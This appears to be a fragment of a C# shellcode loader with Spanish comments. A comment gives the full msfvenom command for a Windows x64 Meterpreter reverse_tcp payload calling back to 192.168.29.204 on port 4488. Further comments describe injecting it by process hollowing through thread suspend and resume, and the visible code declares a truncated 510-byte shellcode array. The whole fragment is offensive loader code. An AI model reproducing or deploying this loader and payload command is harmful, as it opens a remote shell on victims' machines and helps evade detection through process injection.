...
//msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.29.204 lport=4488 -f csharp
//Settear el nombre del proceso que vamos a spawnear en el string proc (lin. 67)
//Aquí se hace con hollowing, openThread-->SuspendThread-->ResumeThread --> Shellcode execution
...
public class Program
{
    ...
    public static void Main()
    {
        ...
        byte[] shellcode = new byte[510] { 0xfc,0x48,0x83,...};
